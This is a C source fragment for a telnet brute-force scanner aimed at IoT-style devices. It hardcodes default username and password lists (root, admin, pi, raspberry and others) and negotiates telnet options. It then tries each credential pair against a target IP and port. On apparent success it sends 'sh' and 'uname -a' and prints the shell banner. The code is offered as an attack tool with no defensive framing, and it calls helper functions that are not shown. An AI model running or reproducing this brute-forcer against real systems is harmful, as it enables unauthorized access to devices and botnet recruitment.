#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>

int total_open_host;
int total_found;
int running_threads;

struct args *data;

struct args {
	char* ip;
	uint16_t port;
};

const char *username[] = {
	"root", "admin", "pi", "raspberry"
};

const char *password[] = {
	"root", "admin", "password", "raspberry", "pi", "Cs6969052!chris"
};

int negotiate(int sock, unsigned char *buf, int len)
{
        unsigned char c;

        switch (buf[1]) {
        case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;

        default:
                break;
        }

        return 0;
}

int matchPrompt(char *bufStr) {

        char *prompts = ":>%$#\0";

        unsigned int bufLen = strlen(bufStr);
        int i, q = 0;

	for(i = 0; i < strlen(prompts); i++) {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }

        return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
        int bufferUsed = initialIndex, got = 0, found = 0;
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = timeout;
        tv.tv_usec = timeoutusec;
        unsigned char *initialRead = NULL;

        while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
        {
                FD_ZERO(&myset);
                FD_SET(fd, &myset);
                if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
                initialRead = buffer + bufferUsed;
                got = recv(fd, initialRead, 1, 0);
                if(got == -1 || got == 0) return 0;
                bufferUsed += got;
                if(*initialRead == 0xFF)
                {
                        got = recv(fd, initialRead + 1, 2, 0);
                        if(got == -1 || got == 0) return 0;
                        bufferUsed += got;
                        if(!negotiate(fd, initialRead, 3)) return 0;
                } else if(strcasestr(buffer, "HTTP/1") == NULL ) {
                        if(strcasestr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
                }
        }

        if(found) return 1;
        return 0;
}

void* brute(void *input) {

	data = (struct args*)input;
	update_pid(data->ip);
	running_threads++;

	for(int n = 0; n < sizeof(username)/sizeof(username[0]); n++) {

		for(int i = 0; i < sizeof(password)/sizeof(password[0]); i++) {

			int sock = socket(AF_INET, SOCK_STREAM, 0);

			if(sock == -1) {
				//printf("Socket fucked\n");
				update_done(data->ip);
				running_threads--;
      				return NULL;
  			}

			struct sockaddr_in sin;

			sin.sin_family = AF_INET;
			sin.sin_port = htons(data->port);
			sin.sin_addr.s_addr = inet_addr(data->ip);

			char *buffer = malloc(512);
			uint16_t bufSize = 0;

  			if(connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) {

				close(sock);
				update_done(data->ip);
				running_threads--;
				return NULL;

			}


			if(readUntil(sock, "uthorized", 10, 10, 5000, buffer, 512, bufSize)) {
				printf("%s\n", buffer);
				if(strcasestr(buffer, "Authorized") != NULL) {
					close(sock);
					break;
				}
			}

			printf("%s\n", buffer);

			if(readUntil(sock, "ogin:", 10, 10, 5000, buffer, 512, bufSize)) {
				if(strcasestr(buffer, "Login") != NULL || strcasestr(buffer, "Username") != NULL) {

					printf("[Attempt Username] %s:%s @ %s:%u", username[n], password[i], data->ip, data->port);
					if(send(sock, username[n], strlen(username[n]), MSG_NOSIGNAL) < 0) {
                                	}

                                	if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                                	}
                                }
printf("[Attempt Password] %s:%s @ %s:%u", username[n], password[i], data->ip, data->port);
			}

			if(readUntil(sock, "assword:", 10, 10, 5000, buffer, 512, bufSize)) {

				if(strcasestr(buffer, "Password") != NULL) {

					if(send(sock, password[i], strlen(password[i]), MSG_NOSIGNAL) < 0) {
						close(sock);
						update_entry(data->ip);
						continue;
					}

					if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) {
						close(sock);
						update_entry(data->ip);
						continue;
					}
				}

			} else if (readUntil(sock, "ncorrect", 10, 10, 5000, buffer, 512, bufSize)) {

				if(strcasestr(buffer, "Invalid") != NULL || strcasestr(buffer, "Incorrect") != NULL) {
					close(sock);
					update_entry(data->ip);
					continue;
				} else {
					if(send(sock, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
						if(send(sock, "uname -a\r\n", 10, MSG_NOSIGNAL) < 0) {
						}
					}
					if(readUntil(sock, "arch", 10, 10, 5000, buffer, 512, bufSize)) {
						printf("[Success] %s\n", buffer);
					}

				}
			}

 			close(sock);
			update_entry(data->ip);
			update_done(data->ip);
			return NULL;
  		}
	}

	total_open_host++;
	update_done(data->ip);
	running_threads--;
	return NULL;
}
